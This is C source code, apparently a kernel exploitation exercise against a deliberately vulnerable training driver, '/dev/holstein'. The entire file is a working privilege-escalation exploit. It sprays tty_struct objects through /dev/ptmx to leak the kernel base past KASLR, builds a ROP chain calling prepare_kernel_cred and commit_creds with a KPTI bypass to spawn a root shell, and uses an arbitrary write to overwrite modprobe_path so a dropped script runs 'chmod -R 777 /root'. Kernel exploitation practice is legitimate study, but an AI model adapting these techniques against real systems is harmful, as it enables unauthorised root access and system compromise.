#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/ioctl.h>
#define BUFFER_SIZE 0x500
static uint64_t kbase;
static uint64_t g_buf;
#define kaslr(addr) (kbase + addr)

void err(const char *format, ...)
{
    if (!format)
    {
        exit(-1);
    }

    fprintf(stderr, "%s", "[!] ");
    va_list args;
    va_start(args, format);
    vfprintf(stderr, format, args);
    va_end(args);
    fprintf(stderr, "%s", "\n");
    exit(-1);
}
void info(const char *format, ...)
{
    if (!format)
    {
        exit(-1);
    }

    fprintf(stdout, "%s", "[+] ");
    va_list args;
    va_start(args, format);
    vfprintf(stdout, format, args);
    va_end(args);
    fprintf(stdout, "%s", "\n");
}

struct save_state
{
    uint64_t cs;
    uint64_t ss;
    uint64_t rsp;
    uint64_t rflags;
};

void save_state(struct save_state *state)
{
    info("Saving state");
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(state->cs), "=r"(state->ss), "=r"(state->rsp), "=r"(state->rflags)
        :
        : "memory");
}

static void win()
{
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    info("You win!");
    execve("/bin/sh", argv, envp);
}

void restore_state(struct save_state *state, void (*f)())
{
    asm volatile("swapgs ;"
                 "movq %0, 0x20(%%rsp)\t\n"
                 "movq %1, 0x18(%%rsp)\t\n"
                 "movq %2, 0x10(%%rsp)\t\n"
                 "movq %3, 0x08(%%rsp)\t\n"
                 "movq %4, 0x00(%%rsp)\t\n"
                 "iretq"
                 :
                 : "r"(state->ss),
                   "r"(state->rsp),
                   "r"(state->rflags),
                   "r"(state->cs), "r"(f));
}

static struct save_state state;
void exp_kaslr(int fd, uint64_t *chain)
{
    const uint64_t prepare_kernel_cred = kaslr(0x74650);
    const uint64_t commit_creds = kaslr(0x744b0);
    const uint64_t pop_rdi = kaslr(0x0d748d);
    const uint64_t mov_rdi_rax = kaslr(0x62707b); // mov rdi, rax; rep movsq [rdi], [rsi]; ret;
    const uint64_t pop_rcx = kaslr(0x13c1c4);     // pop rcx; xor al, 0; ret;

    //    0xffffffff81800e26:  mov    rdi,rsp
    //    0xffffffff81800e29:  mov    rsp,QWORD PTR gs:0x6004
    //    0xffffffff81800e32:  push   QWORD PTR [rdi+0x30]
    //    0xffffffff81800e35:  push   QWORD PTR [rdi+0x28]
    //    0xffffffff81800e38:  push   QWORD PTR [rdi+0x20]
    //    0xffffffff81800e3b:  push   QWORD PTR [rdi+0x18]
    //    0xffffffff81800e3e:  push   QWORD PTR [rdi+0x10]
    //    0xffffffff81800e41:  push   QWORD PTR [rdi]
    //    0xffffffff81800e43:  push   rax
    //    0xffffffff81800e44:  xchg   ax,ax
    //    0xffffffff81800e46:  mov    rdi,cr3
    const uint64_t kpti_bypass = kaslr(0x800e26);

    // RCX: 00000000deadbeef
    // RDX: 00000000cafebabe
    // RSI: 00000000deadbeef
    // R08: 00000000cafebabe
    // R12: 00000000deadbeef
    // R14: 00000000cafebabe

    // to use kpti bypass later on, you dco need to stack piviot. currently, we are in heap. we need to stack piviot
    // *chain++ = 0xdeadbeef;
    *chain++ = pop_rdi;
    *chain++ = 0;
    *chain++ = prepare_kernel_cred;
    // store rax to rdi. so that you can call commit creds
    *chain++ = pop_rcx;
    *chain++ = 0x0;
    *chain++ = mov_rdi_rax;
    *chain++ = commit_creds;
    // call kpti bypass . this will change kernel stack to userspace stack
    *chain++ = kpti_bypass;
    *chain++ = 0xdeadbeefcafebabe; // [rsp]
    *chain++ = 0xdeadbeefcafebabe; // [rsp+8]
    *chain++ = (uint64_t)win;
    *chain++ = state.cs;
    *chain++ = state.rflags;
    *chain++ = state.rsp;
    *chain++ = state.ss;
}

void exp_tty_struct()
{
    save_state(&state);
    // Spraying the heap
    int spray[100];
    for (int i = 0; i < 50; i++)
    {
        spray[i] = open("/dev/ptmx", O_RDONLY);
        if (spray[i] < 0)
        {
            err("Failed to open /dev/ptmx");
        }
    }

    int fd1 = open("/dev/holstein", O_RDWR);
    if (fd1 < 0)
    {
        err("Failed to open device");
    }

    // Spraying the heappp
    for (int i = 50; i < 100; i++)
    {
        spray[i] = open("/dev/ptmx", O_RDONLY);
        if (spray[i] < 0)
        {
            err("Failed to open /dev/ptmx");
        }
    }

    // Leak kaslr
    char buf[BUFFER_SIZE] = {0};
    if (read(fd1, buf, sizeof(buf)) < 0)
    {
        err("Failed to read from device");
    }

    const uint64_t ofs_tty_ops = 0xc38880;
    kbase = *(uint64_t *)(buf + 0x418) - ofs_tty_ops;
    info("Kernel base: 0x%lx", kbase);

    g_buf = *(uint64_t *)(buf + 0x438) - 0x438;
    info("Global buffer: 0x%lx", g_buf);

    uint64_t *fake_tty = (uint64_t *)(buf + 0x400);
    // set up the fake tty_operations struct. at fake_tty[12] is where it holds rip
    // for (int i = 0; i < 0x40; i++)
    // {
    //     *fake_tty++ = 0xffffffffdead0000 + i;
    // }

    // write our exploit here;
    uint64_t *chain = &fake_tty[12];
    const uint64_t push_rdx_mov_ebp_junk_pop_rsp_pop_r13_pop_rbp = kaslr(0x3a478a); // : push rdx ; mov ebp, 0x415BFFD9 ; pop rsp ; pop r13 ; pop rbp ; ret ; (1 found)
    *chain = push_rdx_mov_ebp_junk_pop_rsp_pop_r13_pop_rbp;

    // *chain = 0xcafebabe;
    exp_kaslr(fd1, (uint64_t *)buf);

    // set the tty_buf to point to our g_buf
    *(uint64_t *)&buf[0x418] = g_buf + 0x400;
    info("Writing to device");
    write(fd1, buf, 0x420);

    // get RIP
    for (int i = 0; i < 100; i++)
    {
        // RCX: 00000000deadbeef
        // RDX: 00000000cafebabe
        // RSI: 00000000deadbeef
        // R08: 00000000cafebabe
        // R12: 00000000deadbeef
        // R14: 00000000cafebabe

        // r13, rbp. Reason for this is first we can control the rip but not stack
        // so we need to stack piviot and set the stack to point to the heap. Without this we can bypass kpti since it uses rsp to switch kernel stack to user stack
        ioctl(spray[i], 0xdeadbeef, g_buf - 0x10);
    }

    close(fd1);
}

void aaw32(int fd1, char *buf, int *spray, uint64_t addr, uint32_t val)
{
    uint64_t rop_mov_prdx_rcx = kaslr(0x0477f7); // mov [rdx], rcx ; ret
    uint64_t *p = (uint64_t *)buf;
    p[12] = rop_mov_prdx_rcx;

    *(uint64_t *)&buf[0x418] = g_buf;
    write(fd1, buf, BUFFER_SIZE);

    for (int i = 0; i < 100; i++)
    {
        // RCX: 00000000deadbeef
        // RDX: 00000000cafebabe
        // RSI: 00000000deadbeef
        // R08: 00000000cafebabe
        // R12: 00000000deadbeef
        // R14: 00000000cafebabe

        // r13, rbp. Reason for this is first we can control the rip but not stack
        // so we need to stack piviot and set the stack to point to the heap. Without this we can bypass kpti since it uses rsp to switch kernel stack to user stack
        ioctl(spray[i], val, addr);
    }
}
void exp_mod_probe()
{
    save_state(&state);
    // Spraying the heap
    int spray[100];
    for (int i = 0; i < 50; i++)
    {
        spray[i] = open("/dev/ptmx", O_RDONLY);
        if (spray[i] < 0)
        {
            err("Failed to open /dev/ptmx");
        }
    }

    int fd1 = open("/dev/holstein", O_RDWR);
    if (fd1 < 0)
    {
        err("Failed to open device");
    }

    // Spraying the heappp
    for (int i = 50; i < 100; i++)
    {
        spray[i] = open("/dev/ptmx", O_RDONLY);
        if (spray[i] < 0)
        {
            err("Failed to open /dev/ptmx");
        }
    }

    // Leak kaslr
    char buf[BUFFER_SIZE] = {0};
    if (read(fd1, buf, sizeof(buf)) < 0)
    {
        err("Failed to read from device");
    }

    const uint64_t ofs_tty_ops = 0xc38880;
    kbase = *(uint64_t *)(buf + 0x418) - ofs_tty_ops;
    info("Kernel base: 0x%lx", kbase);

    g_buf = *(uint64_t *)(buf + 0x438) - 0x438;
    info("Global buffer: 0x%lx", g_buf);
    uint64_t addr_modprobe_path = kaslr(0xe38180);

    info("writing to modprobe addr 0x%lx", addr_modprobe_path);
    char cmd[] = "/tmp/evil.sh";

    for (int i = 0; i < sizeof(cmd); i += 4)
    {
        aaw32(fd1, buf, spray, addr_modprobe_path + i, *(unsigned int *)&cmd[i]);
    }

    system("echo -e '#!/bin/sh\nchmod -R 777 /root' > /tmp/evil.sh");
    system("chmod +x /tmp/evil.sh");
    system("echo -e '\xde\xad\xbe\xef' > /tmp/pwn");
    system("chmod +x /tmp/pwn");
    system("/tmp/pwn");
}

int main()
{
    // exp_tty_struct();
    exp_mod_probe();

    return 0;
}
